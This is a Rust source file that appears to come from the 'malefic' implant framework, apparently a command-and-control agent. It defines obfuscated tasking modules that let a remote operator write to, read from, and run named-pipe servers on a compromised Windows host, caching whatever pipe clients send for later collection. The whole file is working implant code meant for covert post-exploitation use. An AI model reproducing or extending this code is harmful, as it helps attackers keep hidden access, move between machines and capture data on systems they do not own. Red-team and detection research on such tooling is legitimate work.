use crate::prelude::*;
use futures::SinkExt;
use futures_timer::Delay;
use malefic_os_win::pipe::{NamedPipe, PipeClient};
use malefic_proto::proto::modulepb::BinaryResponse;
use std::collections::{HashMap, VecDeque};
use std::sync::Mutex;
use std::sync::{
    atomic::{AtomicBool, Ordering},
    Arc,
};
use std::time::Duration;

pub struct PipeUpload {}

#[async_trait]
#[module_impl("pipe_upload")]
impl Module for PipeUpload {}

#[async_trait]
#[obfuscate]
impl malefic_module::ModuleImpl for PipeUpload {
    async fn run(
        &mut self,
        id: u32,
        receiver: &mut malefic_module::Input,
        sender: &mut malefic_module::Output,
    ) -> ModuleResult {
        let request = check_request!(receiver, Body::PipeRequest)?;
        let pipe_name = check_field!(request.name)?;

        let pipe_client = match PipeClient::connect(&pipe_name) {
            Ok(client) => client,
            Err(e) => {
                return Err(e.into());
            }
        };

        if request.data.is_empty() {
            // if data is empty, do nothing
        } else {
            to_error!(pipe_client.write(&request.data))?;
            drop(pipe_client);
            return Ok(TaskResult::new_with_ack(id, 0));
        }

        let _ = sender.send(TaskResult::new_with_ack(id, 0)).await?;

        loop {
            let block = check_request!(receiver, Body::Block)?;

            let data_len = block.content.len();

            if data_len != 0 {
                to_error!(pipe_client.write(&block.content))?;
            }

            if block.end {
                drop(pipe_client);
                return Ok(TaskResult::new_with_ack(id, block.block_id));
            } else {
                let _ = sender
                    .send(TaskResult::new_with_ack(id, block.block_id))
                    .await?;
            }
        }
    }
}

pub struct PipeRead {}

#[async_trait]
#[module_impl("pipe_read")]
impl Module for PipeRead {}

#[async_trait]
#[obfuscate]
impl malefic_module::ModuleImpl for PipeRead {
    async fn run(
        &mut self,
        id: u32,
        receiver: &mut malefic_module::Input,
        _sender: &mut malefic_module::Output,
    ) -> ModuleResult {
        let request = check_request!(receiver, Body::PipeRequest)?;
        let pipe_name: String = check_field!(request.name)?;

        let full_pipe_name = if pipe_name.starts_with("\\\\.\\pipe\\") {
            pipe_name.clone()
        } else {
            format!("\\\\.\\pipe\\{}", pipe_name)
        };

        let has_active_server = {
            let servers = PIPE_SERVERS.lock().unwrap();
            servers.contains_key(&full_pipe_name)
        };

        if has_active_server {
            let cached_bytes = {
                let mut cache = PIPE_DATA_CACHE.lock().unwrap();
                if let Some(queue) = cache.get_mut(&full_pipe_name) {
                    let mut bytes = Vec::new();
                    while let Some(chunk) = queue.pop_front() {
                        bytes.extend_from_slice(&chunk);
                    }
                    bytes
                } else {
                    Vec::new()
                }
            };

            debug!(
                "Read cached data from pipe server {}: {} bytes",
                &full_pipe_name,
                cached_bytes.len()
            );

            return Ok(TaskResult::new_with_body(
                id,
                Body::BinaryResponse(BinaryResponse {
                    data: cached_bytes,
                    message: Vec::new(),
                    err: String::new(),
                    status: 200,
                }),
            ));
        } else {
            let pipe_client = match PipeClient::connect(&pipe_name) {
                Ok(client) => client,
                Err(e) => {
                    debug!("Failed to connect to pipe and no active server found");
                    let resp = Response {
                        output: "".to_string(),
                        error: format!("No active pipe server and failed to connect: {}", e),
                        kv: Default::default(),
                        array: vec![],
                    };
                    return Ok(TaskResult::new_with_body(id, Body::Response(resp)));
                }
            };

            let mut buffer = vec![0; 4096];
            let mut total_content = Vec::new();

            loop {
                let bytes_read = to_error!(pipe_client.read(&mut buffer))? as usize;
                if bytes_read == 0 {
                    drop(pipe_client);
                    break;
                }

                total_content.extend_from_slice(&buffer[..bytes_read]);
            }

            let resp = Response {
                output: String::from_utf8_lossy(&total_content).to_string(),
                error: "".to_string(),
                kv: Default::default(),
                array: vec![],
            };

            Ok(TaskResult::new_with_body(id, Body::Response(resp)))
        }
    }
}

malefic_gateway::lazy_static! {
    static ref PIPE_SERVERS: Arc<Mutex<HashMap<String, Arc<AtomicBool>>>> = Arc::new(Mutex::new(HashMap::new()));
    static ref PIPE_DATA_CACHE: Arc<Mutex<HashMap<String, VecDeque<Vec<u8>>>>> = Arc::new(Mutex::new(HashMap::new()));
}

pub struct PipeServer {}

#[async_trait]
#[module_impl("pipe_server")]
impl Module for PipeServer {}

#[async_trait]
#[obfuscate]
impl malefic_module::ModuleImpl for PipeServer {
    async fn run(
        &mut self,
        id: u32,
        receiver: &mut malefic_module::Input,
        sender: &mut malefic_module::Output,
    ) -> ModuleResult {
        let pipe_info = check_request!(receiver, Body::PipeRequest)?;

        let action = check_field!(pipe_info.target)?; // Use target field as action
        let pipe_name = check_field!(pipe_info.name)?;

        match action.as_str() {
            "start" => self.start_server(id, &pipe_name, sender).await,
            "stop" => self.stop_server(id, &pipe_name).await,
            "list" => self.list_servers(id).await,
            "clear" => self.clear_cache(id, &pipe_name).await,
            "status" => self.get_server_status(id, &pipe_name).await,
            _ => {
                let resp = Response {
                    output: "".to_string(),
                    error: format!(
                        "Unknown action: {}. Available actions: start, stop, list, clear, status",
                        action
                    ),
                    kv: Default::default(),
                    array: vec![],
                };
                Ok(TaskResult::new_with_body(id, Body::Response(resp)))
            }
        }
    }
}

#[obfuscate]
impl PipeServer {
    async fn start_server(
        &mut self,
        id: u32,
        pipe_name: &str,
        _sender: &mut malefic_module::Output,
    ) -> ModuleResult {
        let full_pipe_name = if pipe_name.starts_with("\\\\.\\pipe\\") {
            pipe_name.to_string()
        } else {
            format!("\\\\.\\pipe\\{}", pipe_name)
        };

        {
            let servers = PIPE_SERVERS.lock().unwrap();
            if servers.contains_key(&full_pipe_name) {
                let resp = Response {
                    output: "".to_string(),
                    error: format!("Pipe server {} is already running", full_pipe_name),
                    kv: Default::default(),
                    array: vec![],
                };
                return Ok(TaskResult::new_with_body(id, Body::Response(resp)));
            }
        }

        let running = Arc::new(AtomicBool::new(true));

        {
            let mut servers = PIPE_SERVERS.lock().unwrap();
            servers.insert(full_pipe_name.clone(), running.clone());
        }

        {
            let mut cache = PIPE_DATA_CACHE.lock().unwrap();
            cache.insert(full_pipe_name.clone(), VecDeque::new());
        }

        let pipe_name_clone = full_pipe_name.clone();
        let running_clone = running.clone();

        let handle = std::thread::spawn(move || {
            let mut _client_id = 0u32;

            while running_clone.load(Ordering::Relaxed) {
                let pipe = match NamedPipe::create(&pipe_name_clone) {
                    Ok(pipe) => pipe,
                    Err(_) => {
                        std::thread::sleep(std::time::Duration::from_millis(100));
                        continue;
                    }
                };

                debug!(
                    "Pipe server {} waiting for client connection...",
                    &pipe_name_clone
                );

                if let Err(_) = pipe.wait() {
                    std::thread::sleep(std::time::Duration::from_millis(100));
                    continue;
                }

                _client_id += 1;
                debug!(
                    "Client {} connected to pipe {}",
                    _client_id, &pipe_name_clone
                );

                let mut buffer = vec![0u8; 4096];

                loop {
                    if !running_clone.load(Ordering::Relaxed) {
                        break;
                    }

                    match pipe.read(&mut buffer) {
                        Ok(bytes_read) => {
                            if bytes_read == 0 {
                                debug!(
                                    "Client {} disconnected from pipe {}",
                                    _client_id, &pipe_name_clone
                                );
                                break;
                            }

                            let data = &buffer[..bytes_read as usize];
                            debug!(
                                "Received {} bytes from client {} on pipe {}",
                                bytes_read, _client_id, &pipe_name_clone
                            );

                            {
                                let mut cache = PIPE_DATA_CACHE.lock().unwrap();
                                if let Some(queue) = cache.get_mut(&pipe_name_clone) {
                                    queue.push_back(data.to_vec());
                                    while queue.len() > 1000 {
                                        queue.pop_front();
                                    }
                                }
                            }
                        }
                        Err(_e) => {
                            debug!(
                                "Read error on pipe {} for client {}: {:?}",
                                &pipe_name_clone, _client_id, _e
                            );
                            break;
                        }
                    }

                    std::thread::sleep(std::time::Duration::from_millis(10));
                }

                debug!(
                    "Client {} handler for pipe {} finished",
                    _client_id, &pipe_name_clone
                );
            }

            debug!("Pipe server {} shutting down", &pipe_name_clone);

            {
                let mut servers = PIPE_SERVERS.lock().unwrap();
                servers.remove(&pipe_name_clone);
            }
        });

        let _ = handle;

        let resp = Response {
            output: format!("Pipe server {} started successfully", full_pipe_name),
            error: "".to_string(),
            kv: Default::default(),
            array: vec![],
        };

        Ok(TaskResult::new_with_body(id, Body::Response(resp)))
    }

    async fn stop_server(&mut self, id: u32, pipe_name: &str) -> ModuleResult {
        let full_pipe_name = if pipe_name.starts_with("\\\\.\\pipe\\") {
            pipe_name.to_string()
        } else {
            format!("\\\\.\\pipe\\{}", pipe_name)
        };

        let result = {
            let mut servers = PIPE_SERVERS.lock().unwrap();
            if let Some(running) = servers.remove(&full_pipe_name) {
                running.store(false, Ordering::Relaxed);

                let mut cache = PIPE_DATA_CACHE.lock().unwrap();
                let cache_count = cache.get(&full_pipe_name).map(|q| q.len()).unwrap_or(0);
                cache.remove(&full_pipe_name);

                format!(
                    "Pipe server {} stopped successfully, cleared {} cached messages",
                    full_pipe_name, cache_count
                )
            } else {
                format!("Pipe server {} is not running", full_pipe_name)
            }
        };

        let resp = Response {
            output: result,
            error: "".to_string(),
            kv: Default::default(),
            array: vec![],
        };

        Ok(TaskResult::new_with_body(id, Body::Response(resp)))
    }

    async fn list_servers(&mut self, id: u32) -> ModuleResult {
        let servers = {
            let servers = PIPE_SERVERS.lock().unwrap();
            servers.keys().cloned().collect::<Vec<String>>()
        };

        let output = if servers.is_empty() {
            "No pipe servers are currently running".to_string()
        } else {
            format!("Running pipe servers:\n{}", servers.join("\n"))
        };

        let resp = Response {
            output,
            error: "".to_string(),
            kv: Default::default(),
            array: vec![],
        };

        Ok(TaskResult::new_with_body(id, Body::Response(resp)))
    }

    async fn clear_cache(&mut self, id: u32, pipe_name: &str) -> ModuleResult {
        let full_pipe_name = if pipe_name.starts_with("\\\\.\\pipe\\") {
            pipe_name.to_string()
        } else {
            format!("\\\\.\\pipe\\{}", pipe_name)
        };

        let result = {
            let mut cache = PIPE_DATA_CACHE.lock().unwrap();
            if let Some(queue) = cache.get_mut(&full_pipe_name) {
                let count = queue.len();
                queue.clear();
                format!(
                    "Cleared {} cached messages from pipe {}",
                    count, full_pipe_name
                )
            } else {
                format!("No cache found for pipe {}", full_pipe_name)
            }
        };

        let resp = Response {
            output: result,
            error: "".to_string(),
            kv: Default::default(),
            array: vec![],
        };

        Ok(TaskResult::new_with_body(id, Body::Response(resp)))
    }

    async fn get_server_status(&mut self, id: u32, pipe_name: &str) -> ModuleResult {
        let full_pipe_name = if pipe_name.starts_with("\\\\.\\pipe\\") {
            pipe_name.to_string()
        } else {
            format!("\\\\.\\pipe\\{}", pipe_name)
        };

        let (is_running, cache_size) = {
            let servers = PIPE_SERVERS.lock().unwrap();
            let is_running = servers.contains_key(&full_pipe_name);

            let cache = PIPE_DATA_CACHE.lock().unwrap();
            let cache_size = cache.get(&full_pipe_name).map(|q| q.len()).unwrap_or(0);

            (is_running, cache_size)
        };

        let status = if is_running {
            format!(
                "Pipe server {} is running with {} cached messages",
                full_pipe_name, cache_size
            )
        } else {
            format!("Pipe server {} is not running", full_pipe_name)
        };

        let resp = Response {
            output: status,
            error: "".to_string(),
            kv: Default::default(),
            array: vec![],
        };

        Ok(TaskResult::new_with_body(id, Body::Response(resp)))
    }

    #[allow(dead_code)]
    async fn run_pipe_server(
        pipe_name: &str,
        running: Arc<AtomicBool>,
        _sender: malefic_module::Output,
    ) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
        let mut _client_id = 0u32;

        while running.load(Ordering::Relaxed) {
            let pipe = match NamedPipe::create(pipe_name) {
                Ok(pipe) => pipe,
                Err(_e) => {
                    debug!("Failed to create pipe {}: {:?}", pipe_name, _e);
                    Delay::new(Duration::from_millis(100)).await;
                    continue;
                }
            };

            debug!("Pipe server {} waiting for client connection...", pipe_name);

            if let Err(_e) = pipe.wait() {
                debug!("Failed to wait for client on {}: {:?}", pipe_name, _e);
                Delay::new(Duration::from_millis(100)).await;
                continue;
            }

            _client_id += 1;
            debug!("Client {} connected to pipe {}", _client_id, pipe_name);
        }

        debug!("Pipe server {} shutting down", pipe_name);
        Ok(())
    }
}
